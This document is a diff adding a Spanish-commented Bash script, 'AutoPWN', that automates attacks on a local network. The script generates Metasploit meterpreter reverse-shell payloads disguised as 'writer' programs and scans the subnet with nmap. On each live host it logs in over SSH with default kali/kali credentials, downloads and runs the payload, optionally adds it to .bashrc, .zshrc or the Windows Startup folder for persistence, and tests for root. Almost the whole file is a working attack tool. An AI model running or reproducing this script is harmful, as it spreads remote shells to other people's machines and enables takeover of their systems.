@@ -1,0 +1,208 @@
+#!/bin/bash
+
+# Variables
+youripalways=`ifconfig | grep -Eo 'inet (addr:)?([0-9]*\.){3}[0-9]*' | grep -Eo '([0-9]*\.){3}[0-9]*' | grep -v '127.0.0.1'`
+
+linuxpayload="linux/x86/meterpreter/reverse_tcp"
+windowspayload="windows/meterpreter/reverse_tcp"
+
+exclude_ips=("192.168.1.100" "192.168.1.101") # pon aqui las ips que se deben excluir del ataque
+
+lhost="127.0.0.1"
+iprange="${youripalways%.*}.0/24"
+
+winlport="8181"
+linlport="8080"
+
+sshuser="kali"
+sshpassword="kali"
+
+winworkdir="Desktop" # la carpeta de la victima donde todo el proceso se llevara a cabo
+linworkdir="Desktop" # la carpeta de la victima donde todo el proceso se llevara a cabo
+
+sshstarttoo="no" # abre una terminal de ssh automaticamnete cuando se conecta a una victima
+autoroot="si" # comprueba si la victima tiene root
+startup="no" # añade el payload al inicio para que siempre tengas acceso al PC
+
+# NO PONER ESPACIOS EN LOS NOMBRES, USA BARRA BAJA EN SU LUGAR.
+linuxoutname="writer.elf"
+windowsoutname="writer.exe"
+
+sudo clear
+
+if ! test -d "AutoPWN"; then
+	sudo apt install sshpass
+	sudo apt install lolcat
+	sudo apt install figlet
+	sudo pip install python-nmap
+fi
+
+mkdir AutoPWN
+clear
+
+# Descargar fuente si no existe
+if ! test -f "AutoPWN/Bloody.flf"; then
+    wget https://raw.githubusercontent.com/xero/figlet-fonts/master/Bloody.flf -O AutoPWN/Bloody.flf
+fi
+
+clear
+
+# Presentación
+figlet "AutoPWN" -f AutoPWN/Bloody.flf | lolcat
+echo -e "                            By Andermd\n\n\n" | lolcat
+sleep 5
+
+# Ejecutar Metasploit
+
+echo -e "\e[9;38m[\e[9;32m+\e[9;38m] CREANDO ARCHIVO PARA MSF (\e[9;32mLINUX\e[9;38m)\n\n"
+
+echo "touch AutoPWN/msf && clear" > AutoPWN/linmet.txt
+echo "use exploit/multi/handler" >> AutoPWN/linmet.txt
+echo "set PAYLOAD $linuxpayload" >> AutoPWN/linmet.txt
+echo "set LHOST $lhost" >> AutoPWN/linmet.txt
+echo "set LPORT $linlport" >> AutoPWN/linmet.txt
+echo "exploit -j" >> AutoPWN/linmet.txt
+echo 'clear && figlet "AutoPWN" -f AutoPWN/Bloody.flf && echo "                            By Andermd" && echo "                               LINUX\n"' >> AutoPWN/linmet.txt
+
+
+echo -e "\e[9;38m[\e[9;32m+\e[9;38m] ARCHIVO CREADO\n\n"
+
+echo -e "\e[9;38m[\e[9;32m+\e[9;38m] CREANDO ARCHIVO PARA MSF (\e[9;32mWINDOWS\e[9;38m)\n\n"
+
+echo "touch AutoPWN/msf2 && clear" > AutoPWN/winmet.txt
+echo "use exploit/multi/handler" >> AutoPWN/winmet.txt
+echo "set PAYLOAD $windowspayload" >> AutoPWN/winmet.txt
+echo "set LHOST $lhost" >> AutoPWN/winmet.txt
+echo "set LPORT $winlport" >> AutoPWN/winmet.txt
+echo "exploit -j" >> AutoPWN/winmet.txt
+echo 'clear && figlet "AutoPWN" -f AutoPWN/Bloody.flf && echo "                            By Andermd" && echo "                              WINDOWS\n"' >> AutoPWN/winmet.txt
+
+echo -e "\e[9;38m[\e[9;32m+\e[9;38m] ARCHIVO CREADO\n\n"
+
+echo -e "\e[9;38m[\e[9;32m+\e[9;38m] EJECUTANDO MSF (\e[9;32mLINUX\e[9;38m)\n\n"
+
+gnome-terminal -- bash -c "msfconsole -r `pwd`/AutoPWN/linmet.txt | lolcat"
+
+sleep 3
+
+echo -e "\e[9;38m[\e[9;32m+\e[9;38m] EJECUTANDO MSF (\e[9;32mWINDOWS\e[9;38m)\n\n"
+
+gnome-terminal -- bash -c "msfconsole -r `pwd`/AutoPWN/winmet.txt | lolcat"
+
+while [ ! -f "AutoPWN/msf" ]; do
+    sleep 1
+done
+
+rm AutoPWN/msf
+
+while [ ! -f "AutoPWN/msf2" ]; do
+    sleep 1
+done
+
+rm AutoPWN/msf2
+
+# Generar exploit
+echo -e "\e[9;38m[\e[9;32m+\e[9;38m] GENERANDO EXPLOIT PARA \e[9;32mLINUX\n\n"
+mkdir -p AutoPWN/server
+msfvenom -p ${linuxpayload} LHOST=${lhost} LPORT=${linlport} -f elf > AutoPWN/server/${linuxoutname} 2>/dev/null
+
+echo -e "\e[9;38m[\e[9;32m+\e[9;38m] GENERANDO EXPLOIT PARA \e[9;32mWINDOWS\n\n"
+mkdir -p AutoPWN/server
+msfvenom -p ${windowspayload} LHOST=${lhost} LPORT=${winlport} -f exe > AutoPWN/server/${windowsoutname} 2>/dev/null
+
+# Ejecutar servidor HTTP
+echo -e "\e[9;38m[\e[9;32m+\e[9;38m] EJECUTANDO SERVIDOR\n\n"
+gnome-terminal -- bash -c "cd `pwd`/AutoPWN/server && python3 -m http.server 4444"
+
+sleep 7
+
+# Escanear IPs en el rango
+echo -e "\e[9;38m[\e[9;32m+\e[9;38m] ESCANEANDO LA RED WIFI EN BUSCA DE PC(s)\n\n"
+nmap -n -sn ${iprange} -oG - | awk '/Up$/{print $2}' > AutoPWN/ips.txt
+
+num_lineas=$(wc -l < "AutoPWN/ips.txt")
+
+echo -e "\e[9;38m[\e[9;32m+\e[9;38m] \e[9;32m$num_lineas\e[9;38m IP(s) ENCONTRADAS\n\n"
+
+# Mandar exploit a IPs vulnerables
+
+fecha=`date`
+
+rootfound="false"
+
+echo -e "--------------------$fecha--------------------" >> AutoPWN/SSHlog.txt
+
+for (( i = 1; i <= num_lineas; i++ )); do
+ip=$(sed "${i}q;d" "AutoPWN/ips.txt")
+    if [[ " ${exclude_ips[@]} " =~ " $ip " ]]; then
+        echo "EL PC \e[9;31m$ip\e[9;38m ESTA EXCLUIDO, OMITIENDO..."
+        continue
+    fi
+    echo -e "\e[9;38m[\e[9;32m+\e[9;38m] COMPROBANDO OS DEL PC \e[9;32m$ip\e[9;38m, ESPERA POR FAVOR...\n\n"
+        
+    OS=$(sudo timeout 45 python osdetect.py ${ip})
+        
+    if echo "$OS" | grep -q "$ip"; then
+        OS="\e[9;31mSISTEMA OPERATIVO NO IDENTIFICADO\e[9;38m"
+    elif [ "$OS" = "" ]; then
+        OS="\e[9;31mSISTEMA OPERATIVO NO IDENTIFICADO\e[9;38m"
+    fi
+        
+    echo -e "\e[9;38m[\e[9;32m+\e[9;38m] EL OS DEL PC \e[9;32m$ip\e[9;38m ES $OS\n\n"
+        
+    echo -e "\e[9;38m[\e[9;32m+\e[9;38m] INTENTANDO MANDAR EXPLOIT AL PC \e[9;32m$ip\e[9;38m ($OS), ESPERA POR FAVOR...\n\n"
+        
+    if echo "$OS" | grep -q "SISTEMA OPERATIVO NO IDENTIFICADO"; then
+        OS="LINUX"
+    fi
+        
+    if echo "$OS" | grep -q "LINUX"; then
+        output=$(timeout 9 sshpass -p "$sshpassword" ssh -o StrictHostKeyChecking=no "$sshuser"@"$ip" "cd $linworkdir && echo old > $linuxoutname && rm -f $linuxoutname && wget http://$lhost:4444/$linuxoutname && chmod 777 $linuxoutname && echo correcto && ./$linuxoutname" 2>&1)
+    elif echo "$OS" | grep -q "WINDOWS"; then
+        output=$(timeout 9 sshpass -p "$sshpassword" ssh -o StrictHostKeyChecking=no "$sshuser"@"$ip" "cd \"$winworkdir\" & taskkill /F /IM \"$windowsoutname\" & del \"$windowsoutname\" & curl \"http://$lhost:4444/$windowsoutname\" --output $windowsoutname & echo correcto & call $windowsoutname" 2>&1)
+    fi
+        
+    echo "$output" >> AutoPWN/SSHlog.txt
+        
+    if echo "$output" | grep -q "correcto"; then
+        echo -e "\e[9;38m[\e[9;32m+\e[9;38m] ¡EXPLOIT ENVIADO CORRECTAMENTE A \e[9;32m$ip\e[9;38m!\n\n"
+        
+        if [ "$startup" = "si" ]; then
+            echo -e "\e[9;38m[\e[9;32m+\e[9;38m] INTENTANDO AÑADIR EL EXPLOIT AL INICIO EN EL PC \e[9;32m$ip\e[9;38m\n\n"
+            if echo "$OS" | grep -q "LINUX"; then
+                timeout 9 sshpass -p "$sshpassword" ssh -o StrictHostKeyChecking=no "$sshuser"@"$ip" "cp \"$linworkdir/$linuxoutname\" ~/$linuxoutname & echo -e \"output=\\\"\\\`ps aux\\\`\\\"\nif echo \\\"\\\$output\\\" | grep -q \\\"$linuxoutname\\\"; then\nsleep 1\nelse\n./$linuxoutname &\nfi\nclear\" >> ~/.bashrc & echo -e \"output=\\\"\\\`ps aux\\\`\\\"\nif echo \\\"\\\$output\\\" | grep -q \\\"$linuxoutname\\\"; then\nsleep 1\nelse\n./$linuxoutname &\nfi\nclear\" >> ~/.zshrc" >/dev/null 2>&1
+            else
+                timeout 9 sshpass -p "$sshpassword" ssh -o StrictHostKeyChecking=no "$sshuser"@"$ip" "copy \"$winworkdir\\$windowsoutname\" \"%appdata%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\$windowsoutname\" /y" >/dev/null 2>&1
+            fi
+        fi
+            
+        if [ "$autoroot" = "si" ]; then
+            if echo "$OS" | grep -q "LINUX"; then
+                echo -e "\e[9;38m[\e[9;32m+\e[9;38m] COMPROBANDO SI \e[9;32m$ip\e[9;38m TIENE ROOT\n\n"
+                output2=$(timeout 7 sshpass -p "$sshpassword" ssh -o StrictHostKeyChecking=no "$ip" "echo '$sshpassword' | sudo -S su -c 'whoami'" 2>&1)
+                if echo "$output2" | grep -q "root"; then
+                    echo -e "[+] ¡¡¡EL PC $ip TIENE ROOT!!!\n\n" | lolcat
+                    echo -e "[+] El PC $ip tiene acceso a root mediante la contraseña $sshpassword.\n" >> AutoPWN/ROOTlog.txt
+                    rootfound="true"
+                else
+                    echo -e "\e[9;38m[\e[9;31m-\e[9;38m] EL PC \e[9;31m$ip\e[9;38m NO TIENE ROOT\n\n"
+                fi
+            fi
+        fi
+            
+        if [ "$sshstarttoo" = "si" ]; then
+            echo -e "\e[9;38m[\e[9;32m+\e[9;38m] ABRIENDO TERMINAL DE SSH PARA \e[9;32m$ip\n\n"
+            gnome-terminal -- bash -c "sshpass -p $sshpassword ssh $sshuser@$ip | lolcat"
+        fi
+    else
+        echo -e "\e[9;38m[\e[9;31m-\e[9;38m] EL ORDENADOR \e[9;31m$ip\e[9;38m NO ES VULNERABLE\n\n"
+    fi
+    
+done
+
+echo -e "\n--------------------$fecha--------------------\n" >> AutoPWN/SSHlog.txt
+echo -e "\e[9;38m[\e[9;32m+\e[9;38m] LOG GUARDADO EN \e[9;32mAutoPWN/SSHlog.txt"
+
+if [ "$rootfound" = "true" ]; then
+	echo -e "\n\n[+] TODOS LOS USUARIOS CON ROOT Y SUS DATOS IMPORTANTES SE HAN GUARDADO EN AutoPWN/ROOTlog.txt" | lolcat
+fi
